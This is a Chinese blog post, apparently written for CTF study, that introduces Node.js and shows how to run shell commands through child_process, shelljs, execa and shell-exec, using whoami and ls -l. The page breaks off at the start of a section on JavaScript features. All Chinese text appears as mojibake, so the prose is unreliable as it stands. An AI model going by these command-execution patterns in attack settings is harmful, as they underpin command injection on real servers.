<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>node.js?æˆ‘ç›´æ¥å°±æ˜¯å­¦å­¦å­¦ï¼ | 1azy_fish.</title><meta name="author" content="1azy_fish."><meta name="copyright" content="1azy_fish."><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="node.jséšä¾¿å­¦ä¸€å­¦ï¼ˆå…¥é—¨å‘å‰è¨€ï¼šnode.jsï¼Ÿæµ…æµ…åœ°å­¦ä¸€å­¦å§ã€‚   æœªè§£å†³çš„é—®é¢˜ï¼šnodeç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œå¾ˆå¤šä¸œè¥¿æ— æ³•ä»£ç å®¡è®¡ï¼Œå…ˆå‡‘åˆçœ‹ã€‚  å…³äºä»£ç çš„å®¡è®¡ä¸CVEçš„å®¡è®¡ä¼šåœ¨ä¹‹åå­¦ä¹ node.jsä»£ç å®¡è®¡ä¸­è¿›è¡Œã€‚  ä»€ä¹ˆæ˜¯node.jsï¼ŸNode.jsæ˜¯ä¸€ä¸ªåŸºäºChrome V8 JavaScriptå¼•æ“çš„å¼€æºã€è·¨å¹³å°çš„è¿è¡Œæ—¶ç¯å¢ƒï¼Œç”¨äºæ„å»ºæœåŠ¡å™¨ç«¯å’Œç½‘ç»œåº”ç”¨ç¨‹åºã€‚å®ƒå…è®¸ä½¿ç”¨JavaScrip"><meta property="og:type" content="article"><meta property="og:title" content="node.js?æˆ‘ç›´æ¥å°±æ˜¯å­¦å­¦å­¦ï¼"><meta property="og:url" content="https://gitee.com/la2y_fish/blog.git/2023/10/13/node-js-%E6%88%91%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF%E5%AD%A6%E5%AD%A6%E5%AD%A6%EF%BC%81/index.html"><meta property="og:site_name" content="1azy_fish."><meta property="og:description" content="node.jséšä¾¿å­¦ä¸€å­¦ï¼ˆå…¥é—¨å‘å‰è¨€ï¼šnode.jsï¼Ÿæµ…æµ…åœ°å­¦ä¸€å­¦å§ã€‚   æœªè§£å†³çš„é—®é¢˜ï¼šnodeç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œå¾ˆå¤šä¸œè¥¿æ— æ³•ä»£ç å®¡è®¡ï¼Œå…ˆå‡‘åˆçœ‹ã€‚  å…³äºä»£ç çš„å®¡è®¡ä¸CVEçš„å®¡è®¡ä¼šåœ¨ä¹‹åå­¦ä¹ node.jsä»£ç å®¡è®¡ä¸­è¿›è¡Œã€‚  ä»€ä¹ˆæ˜¯node.jsï¼ŸNode.jsæ˜¯ä¸€ä¸ªåŸºäºChrome V8 JavaScriptå¼•æ“çš„å¼€æºã€è·¨å¹³å°çš„è¿è¡Œæ—¶ç¯å¢ƒï¼Œç”¨äºæ„å»ºæœåŠ¡å™¨ç«¯å’Œç½‘ç»œåº”ç”¨ç¨‹åºã€‚å®ƒå…è®¸ä½¿ç”¨JavaScrip"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://gitee.com/la2y_fish/blog.git/img/9.jpg"><meta property="article:published_time" content="2023-10-13T09:06:36.000Z"><meta property="article:modified_time" content="2023-10-14T09:46:59.013Z"><meta property="article:author" content="1azy_fish."><meta property="article:tag" content="CTF"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://gitee.com/la2y_fish/blog.git/img/9.jpg"><link rel="shortcut icon" href="/blog/img/%E8%8A%9C%E6%B9%96.png"><link rel="canonical" href="https://gitee.com/la2y_fish/blog.git/2023/10/13/node-js-%E6%88%91%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF%E5%AD%A6%E5%AD%A6%E5%AD%A6%EF%BC%81/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/blog/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload='this.media="all"'><script>const GLOBAL_CONFIG={root:"/blog/",algolia:void 0,localSearch:void 0,translate:void 0,noticeOutdate:{limitDay:500,position:"top",messagePrev:"It has been",messageNext:"days since the last update, the content of the article may be outdated."},highlight:{plugin:"highlighjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"å¤åˆ¶æˆåŠŸ",error:"å¤åˆ¶é”™è¯¯",noSupport:"æµè§ˆå™¨ä¸æ”¯æŒ"},relativeDate:{homepage:!1,post:!1},runtime:"",date_suffix:{just:"åˆšåˆš",min:"åˆ†é’Ÿå‰",hour:"å°æ—¶å‰",day:"å¤©å‰",month:"ä¸ªæœˆå‰"},copyright:void 0,lightbox:"fancybox",Snackbar:void 0,source:{justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js",css:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css"}},isPhotoFigcaption:!1,islazyload:!1,isAnchor:!1,percent:{toc:!0,rightside:!1}}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"node.js?æˆ‘ç›´æ¥å°±æ˜¯å­¦å­¦å­¦ï¼",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2023-10-14 17:46:59"}</script><noscript><style type="text/css">#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,a){0!==a&&(a=864e5*a,t={value:t,expiry:(new Date).getTime()+a},localStorage.setItem(e,JSON.stringify(t)))},get:function(e){var t=localStorage.getItem(e);if(t){t=JSON.parse(t);if(!((new Date).getTime()>t.expiry))return t.value;localStorage.removeItem(e)}}},e.getScript=o=>new Promise((t,e)=>{const a=document.createElement("script");a.src=o,a.async=!0,a.onerror=e,a.onload=a.onreadystatechange=function(){var e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(a.onload=a.onreadystatechange=null,t())},document.head.appendChild(a)}),e.getCSS=(o,n=!1)=>new Promise((t,e)=>{const a=document.createElement("link");a.rel="stylesheet",a.href=o,n&&(a.id=n),a.onerror=e,a.onload=a.onreadystatechange=function(){var e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(a.onload=a.onreadystatechange=null,t())},document.head.appendChild(a)}),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};e=saveToLocal.get("theme"),"dark"===e?activateDarkMode():"light"===e&&activateLightMode(),e=saveToLocal.get("aside-status");void 0!==e&&("hide"===e?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/macWhite.css"><link rel="stylesheet" href="/blog/css/mouse.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="/blog/img/head%20(1).jpg" onerror='onerror=null,src="/img/head (1).jpg"' alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/blog/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">20</div></a><a href="/blog/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">3</div></a><a href="/blog/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">4</div></a></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/blog/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> åšæ–‡</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/blog/categories/"><i class="fa-fw fa fa-archive"></i><span> åˆ†ç±»</span></a></li><li><a class="site-page child" href="/blog/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></li><li><a class="site-page child" href="/blog/archives/"><i class="fa-fw fa fa-folder-open"></i><span> å½’æ¡£</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> ç”Ÿæ´»</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/blog/shuoshuo/"><i class="fa-fw fa fa-book"></i><span> åˆ†äº«</span></a></li><li><a class="site-page child" href="/blog/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> ç›¸å†Œ</span></a></li><li><a class="site-page child" href="/blog/music/"><i class="fa-fw fa fa-music"></i><span> éŸ³ä¹</span></a></li><li><a class="site-page child" href="/blog/movies/"><i class="fa-fw fas fa-video"></i><span> ç•ªå‰§</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/blog/tool/"><i class="fa-fw fas fa-box"></i><span> å·¥å…·ç®±ï¼ˆæ›´æ–°ingï¼‰</span></a></div><div class="menus_item"><a class="site-page" href="/blog/link/"><i class="fa-fw fa fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/blog/comments/"><i class="fa-fw fa fa-paper-plane"></i><span> ç•™è¨€æ¿</span></a></div><div class="menus_item"><a class="site-page" href="/blog/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äºç¬”è€…</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(/blog/img/9.jpg)"><nav id="nav"><span id="blog-info"><a href="/blog/" title="1azy_fish."><span class="site-name">1azy_fish.</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/blog/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> åšæ–‡</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/blog/categories/"><i class="fa-fw fa fa-archive"></i><span> åˆ†ç±»</span></a></li><li><a class="site-page child" href="/blog/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></li><li><a class="site-page child" href="/blog/archives/"><i class="fa-fw fa fa-folder-open"></i><span> å½’æ¡£</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> ç”Ÿæ´»</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/blog/shuoshuo/"><i class="fa-fw fa fa-book"></i><span> åˆ†äº«</span></a></li><li><a class="site-page child" href="/blog/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> ç›¸å†Œ</span></a></li><li><a class="site-page child" href="/blog/music/"><i class="fa-fw fa fa-music"></i><span> éŸ³ä¹</span></a></li><li><a class="site-page child" href="/blog/movies/"><i class="fa-fw fas fa-video"></i><span> ç•ªå‰§</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/blog/tool/"><i class="fa-fw fas fa-box"></i><span> å·¥å…·ç®±ï¼ˆæ›´æ–°ingï¼‰</span></a></div><div class="menus_item"><a class="site-page" href="/blog/link/"><i class="fa-fw fa fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/blog/comments/"><i class="fa-fw fa fa-paper-plane"></i><span> ç•™è¨€æ¿</span></a></div><div class="menus_item"><a class="site-page" href="/blog/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äºç¬”è€…</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">node.js?æˆ‘ç›´æ¥å°±æ˜¯å­¦å­¦å­¦ï¼</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-10-13T09:06:36.000Z" title="å‘è¡¨äº 2023-10-13 17:06:36">2023-10-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-10-14T09:46:59.013Z" title="æ›´æ–°äº 2023-10-14 17:46:59">2023-10-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/blog/categories/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="node.js?æˆ‘ç›´æ¥å°±æ˜¯å­¦å­¦å­¦ï¼"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="node-jséšä¾¿å­¦ä¸€å­¦ï¼ˆå…¥é—¨å‘"><a href="#node-jséšä¾¿å­¦ä¸€å­¦ï¼ˆå…¥é—¨å‘" class="headerlink" title="node.jséšä¾¿å­¦ä¸€å­¦ï¼ˆå…¥é—¨å‘"></a>node.jséšä¾¿å­¦ä¸€å­¦ï¼ˆå…¥é—¨å‘</h1><p>å‰è¨€ï¼šnode.jsï¼Ÿæµ…æµ…åœ°å­¦ä¸€å­¦å§ã€‚</p><ul><li><input disabled type="checkbox"> æœªè§£å†³çš„é—®é¢˜ï¼šnodeç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œå¾ˆå¤šä¸œè¥¿æ— æ³•ä»£ç å®¡è®¡ï¼Œå…ˆå‡‘åˆçœ‹ã€‚</li><li><input disabled type="checkbox"> å…³äºä»£ç çš„å®¡è®¡ä¸CVEçš„å®¡è®¡ä¼šåœ¨ä¹‹åå­¦ä¹ node.jsä»£ç å®¡è®¡ä¸­è¿›è¡Œã€‚</li></ul><h2 id="ä»€ä¹ˆæ˜¯node-jsï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯node-jsï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯node.jsï¼Ÿ"></a>ä»€ä¹ˆæ˜¯node.jsï¼Ÿ</h2><p>Node.jsæ˜¯ä¸€ä¸ªåŸºäºChrome V8 JavaScriptå¼•æ“çš„å¼€æºã€è·¨å¹³å°çš„è¿è¡Œæ—¶ç¯å¢ƒï¼Œç”¨äºæ„å»ºæœåŠ¡å™¨ç«¯å’Œç½‘ç»œåº”ç”¨ç¨‹åºã€‚å®ƒå…è®¸ä½¿ç”¨JavaScriptä½œä¸ºæœåŠ¡å™¨ç«¯è¯­è¨€æ¥ç¼–å†™é«˜æ€§èƒ½ã€å¯æ‰©å±•çš„åº”ç”¨ç¨‹åºã€‚</p><p>Node.jsçš„ç‰¹ç‚¹åŒ…æ‹¬ï¼šï¼ˆæœåˆ°çš„è§£é‡Šï¼‰</p><blockquote><ol><li>å¼‚æ­¥éé˜»å¡I&#x2F;Oæ¨¡å‹ï¼šNode.jsä½¿ç”¨äº‹ä»¶é©±åŠ¨å’Œéé˜»å¡I&#x2F;Oæ¨¡å‹ï¼Œä½¿å¾—åº”ç”¨ç¨‹åºèƒ½å¤Ÿä»¥é«˜æ•ˆçš„æ–¹å¼å¤„ç†å¤§é‡å¹¶å‘è¯·æ±‚ã€‚å®ƒä½¿ç”¨å•çº¿ç¨‹äº‹ä»¶å¾ªç¯æ¥å¤„ç†è¯·æ±‚ï¼Œè€Œä¸æ˜¯ä¸ºæ¯ä¸ªè¯·æ±‚åˆ›å»ºæ–°çš„çº¿ç¨‹ï¼Œä»è€Œå‡å°‘äº†ç³»ç»Ÿèµ„æºçš„æ¶ˆè€—å’Œå¼€é”€ã€‚</li><li>è½»é‡å’Œé«˜æ•ˆï¼šNode.jsçš„è®¾è®¡ç›®æ ‡æ˜¯è½»é‡çº§å’Œé«˜æ•ˆæ€§èƒ½ã€‚å®ƒé‡‡ç”¨äº†ä¸€ç§æ¨¡å—åŒ–çš„æ¶æ„ï¼Œä½¿å¾—å¼€å‘è€…å¯ä»¥é€šè¿‡ç»„åˆå„ç§æ¨¡å—æ¥æ„å»ºå¤æ‚çš„åº”ç”¨ç¨‹åºã€‚åŒæ—¶ï¼ŒNode.jsåˆ©ç”¨äº†JavaScriptçš„ä¼˜åŠ¿ï¼Œé€šè¿‡ä½¿ç”¨V8å¼•æ“å®ç°é«˜æ€§èƒ½çš„ä»£ç æ‰§è¡Œã€‚</li><li>è·¨å¹³å°ï¼šNode.jså¯ä»¥åœ¨å¤šä¸ªæ“ä½œç³»ç»Ÿä¸Šè¿è¡Œï¼ŒåŒ…æ‹¬Windowsã€macOSå’ŒLinuxç­‰ã€‚è¿™æ„å‘³ç€å¼€å‘è€…å¯ä»¥ä½¿ç”¨ç›¸åŒçš„ä»£ç åœ¨ä¸åŒçš„å¹³å°ä¸Šæ„å»ºåº”ç”¨ç¨‹åºï¼Œæé«˜äº†å¼€å‘çš„æ•ˆç‡å’Œå¯ç§»æ¤æ€§ã€‚</li><li>ä¸°å¯Œçš„ç”Ÿæ€ç³»ç»Ÿï¼šNode.jsæ‹¥æœ‰åºå¤§è€Œæ´»è·ƒçš„å¼€æºç¤¾åŒºï¼Œæä¾›äº†å¤§é‡çš„æ¨¡å—å’Œå·¥å…·ï¼Œå¯ä»¥ç”¨äºæ„å»ºå„ç§ç±»å‹çš„åº”ç”¨ç¨‹åºã€‚NPMï¼ˆNode Package Managerï¼‰æ˜¯Node.jsçš„åŒ…ç®¡ç†å™¨ï¼Œå®ƒå…è®¸å¼€å‘è€…æ–¹ä¾¿åœ°å®‰è£…ã€å‘å¸ƒå’Œå…±äº«ä»£ç æ¨¡å—ã€‚</li></ol></blockquote><h2 id="node-jså’Œjsçš„å…³ç³»"><a href="#node-jså’Œjsçš„å…³ç³»" class="headerlink" title="node.jså’Œjsçš„å…³ç³»"></a>node.jså’Œjsçš„å…³ç³»</h2><p>Node.jsæ˜¯åŸºäºJavaScriptè¯­è¨€çš„è¿è¡Œæ—¶ç¯å¢ƒï¼Œå®ƒæ‰©å±•äº†JavaScriptçš„èƒ½åŠ›ï¼Œä½¿å¾—JavaScriptå¯ä»¥åœ¨æœåŠ¡å™¨ç«¯è¿è¡Œã€‚å› æ­¤ï¼Œå¯ä»¥è¯´Node.jsæ˜¯JavaScriptçš„ä¸€ä¸ªæ‰§è¡Œç¯å¢ƒæˆ–å¹³å°ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶Node.jsä¸JavaScriptå¯†åˆ‡ç›¸å…³ï¼Œä½†å®ƒä»¬å¹¶ä¸æ˜¯å®Œå…¨ç›¸åŒçš„ã€‚Node.jsæä¾›äº†ä¸€äº›ç‹¬æœ‰çš„APIå’Œæ¨¡å—ï¼Œä¾‹å¦‚<code>http</code>æ¨¡å—ç”¨äºåˆ›å»ºWebæœåŠ¡å™¨ï¼Œè€Œæµè§ˆå™¨ä¸­å¹¶æ²¡æœ‰è¿™äº›åŠŸèƒ½ã€‚å¦å¤–ï¼ŒNode.jsä¹Ÿæ²¡æœ‰ç›´æ¥è®¿é—®DOMï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰çš„èƒ½åŠ›ï¼Œå› ä¸ºDOMæ˜¯æµè§ˆå™¨ç¯å¢ƒç‰¹æœ‰çš„ã€‚ä½†æ˜¯ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–åº“æˆ–æ¨¡å—æ¥æ¨¡æ‹ŸDOMçš„ä¸€äº›åŠŸèƒ½ã€‚</p><p>æ€»ç»“è€Œè¨€ï¼ŒNode.jsæ˜¯åŸºäºJavaScriptè¯­è¨€çš„è¿è¡Œæ—¶ç¯å¢ƒï¼Œæ‰©å±•äº†JavaScriptåœ¨æœåŠ¡å™¨ç«¯çš„èƒ½åŠ›ï¼Œä½¿å…¶å¯ä»¥ç”¨äºæ„å»ºé«˜æ€§èƒ½çš„æœåŠ¡å™¨ç«¯åº”ç”¨ç¨‹åºã€‚JavaScriptæ˜¯ä¸€ç§è„šæœ¬è¯­è¨€ï¼Œæœ€åˆè®¾è®¡ç”¨äºåœ¨æµè§ˆå™¨ä¸­è¿è¡Œï¼Œå¹¶é€šè¿‡Node.jså¯ä»¥åœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œã€‚</p><h2 id="node-jsçš„ä¸€äº›shell"><a href="#node-jsçš„ä¸€äº›shell" class="headerlink" title="node.jsçš„ä¸€äº›shell"></a>node.jsçš„ä¸€äº›shell</h2><p>å¸¸è§çš„Node.jsä¸­ä½¿ç”¨shellè¯­æ³•çš„ç¤ºä¾‹ï¼š</p><ol><li>ä½¿ç”¨<code>child_process</code>æ¨¡å—æ‰§è¡Œshellå‘½ä»¤ï¼š</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">exec</span>(<span class="string">&#x27;whoami&#x27;</span>, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`æ‰§è¡Œå‘½ä»¤å‡ºé”™: <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`å‘½ä»¤è¾“å‡º: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="2"><li>ä½¿ç”¨<code>shelljs</code>æ¨¡å—æ‰§è¡Œshellå‘½ä»¤ï¼š</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> shell = <span class="built_in">require</span>(<span class="string">&#x27;shelljs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result = shell.<span class="title function_">exec</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`å‘½ä»¤è¾“å‡º: <span class="subst">$&#123;result.stdout&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><ol start="3"><li>ä½¿ç”¨<code>spawn</code>å‡½æ•°æ‰§è¡Œshellå‘½ä»¤å¹¶å¤„ç†è¾“å‡ºï¼š</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ls = <span class="title function_">spawn</span>(<span class="string">&#x27;ls&#x27;</span>, [<span class="string">&#x27;-l&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">ls.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`å‘½ä»¤è¾“å‡º: <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ls.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`å‘½ä»¤é”™è¯¯è¾“å‡º: <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ls.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`å‘½ä»¤æ‰§è¡Œç»“æŸï¼Œé€€å‡ºç : <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="4"><li><code>execa</code>: è¿™æ˜¯ä¸€ä¸ªç®€å•è€Œå¼ºå¤§çš„æ¨¡å—ï¼Œç”¨äºæ‰§è¡Œå¤–éƒ¨å‘½ä»¤ã€‚å®ƒæä¾›äº†æ›´å¥½çš„é”™è¯¯å¤„ç†å’Œæµæ§åˆ¶ï¼Œæ”¯æŒå¼‚æ­¥å’ŒåŒæ­¥æ‰§è¡Œå‘½ä»¤ã€‚</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> execa = <span class="built_in">require</span>(<span class="string">&#x27;execa&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¼‚æ­¥æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"><span class="title function_">execa</span>(<span class="string">&#x27;ls&#x27;</span>, [<span class="string">&#x27;-l&#x27;</span>]).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">stdout</span>);</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒæ­¥æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"><span class="keyword">const</span> result = execa.<span class="title function_">sync</span>(<span class="string">&#x27;ls&#x27;</span>, [<span class="string">&#x27;-l&#x27;</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">stdout</span>);</span><br></pre></td></tr></table></figure><ol start="5"><li><code>shell-exec</code>: è¿™æ˜¯ä¸€ä¸ªè½»é‡çº§çš„æ¨¡å—ï¼Œç”¨äºæ‰§è¡ŒShellå‘½ä»¤ã€‚å®ƒæä¾›äº†ç®€å•çš„APIï¼Œæ”¯æŒå¼‚æ­¥å’ŒåŒæ­¥æ‰§è¡Œå‘½ä»¤ã€‚</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> shellExec = <span class="built_in">require</span>(<span class="string">&#x27;shell-exec&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¼‚æ­¥æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"><span class="title function_">shellExec</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">stdout</span>);</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒæ­¥æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"><span class="keyword">const</span> result = shellExec.<span class="title function_">sync</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">stdout</span>);</span><br></pre></td></tr></table></figure><h2 id="javascriptç‰¹æ€§"><a href="#javascriptç‰¹æ€§" class="headerlink" title="javascriptç‰¹æ€§"></a>javascriptç‰¹æ€§</h2><p>åœ¨javascriptä¸­æœ‰å‡ 